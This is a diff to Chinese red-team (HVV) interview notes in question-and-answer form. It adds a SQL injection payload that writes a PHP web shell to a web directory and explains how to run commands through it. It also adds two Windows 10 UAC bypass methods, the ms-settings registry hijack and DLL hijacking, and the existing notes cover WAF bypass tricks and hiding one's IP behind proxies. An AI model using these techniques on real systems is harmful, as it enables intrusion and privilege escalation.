@@ -1,7 +1,6 @@
 ---
 title: HVV 面经
 date: 2023-05-06T12:52:00.000Z
-
 ---
 
 
@@ -82,6 +81,8 @@ uptime    查看登陆多久、多少用户，负载
 - 答：双空格，/**/，括号或者用回车代替。
 - 答：使用/**/或者<>分割关键字；双写绕过（例如selectselect）；
 - 问：sql 如何写 shell？
+  - UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php’
+  - 成功注入Web Shell后，你可以通过访问其URL来使用它。例如，如果Web Shell位于http://example.com/uploads/shell.php，你可以在URL中附加一个cmd参数来执行命令。
 - 问：sql注入时IP被记录怎么办？
 - 答：使用代理服务器，使用VPN。
 
@@ -93,6 +94,8 @@ uptime    查看登陆多久、多少用户，负载
 - 问：你知道哪些恶意流量分析工具？
 - 答：Wireshark Brim TShark
 - 问：Win10 UAC 如何绕过？
+  - 注册表修改：某些注册表键值允许在启动时执行程序，例如HKCU\Software\Classes\ms-settings\shell\open\command。可以修改这些键值，使其执行一个提权程序。
+  - 动态链接库劫持（DLL Hijacking）：这种方法涉及创建一个恶意DLL文件，并将其放置在特定的路径下，以便当具有自动提升权限的可执行文件加载时，恶意DLL将被执行。这种方法要求你找到一个在DLL搜索路径上具有写入权限的位置。
 
 ## Java
 - 问：知道 Java 反序列化吗？
